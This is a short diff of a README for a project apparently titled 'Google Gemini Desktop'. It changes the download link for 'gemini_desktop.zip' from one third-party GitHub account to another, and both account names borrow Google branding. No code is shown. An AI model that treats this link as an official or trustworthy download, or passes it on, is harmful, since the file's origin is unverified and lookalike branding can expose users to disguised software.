@@ -8,7 +8,7 @@ Google Gemini Desktop brings the power of Gemini Pro, Gemini 2.0 Flash, Gemini 2
 
 
 ## Install
-[Download `gemini_desktop.zip`](https://github.com/googlegemini-ai/Google-Gemini-Desktop/releases/download/v0.12.2/gemini_desktop.zip)
+[Download `gemini_desktop.zip`](https://github.com/google-gemini-desktop/Google-Gemini-Desktop/releases/download/v0.12.2/gemini_desktop.zip)
 ---
 
 <img width="1692" height="930" alt="63490e84-9832-43b6-814a-2f5024b5d37e" src="https://github.com/user-attachments/assets/a6380abb-f94f-4f13-b1c7-0bae35f83cb7" />
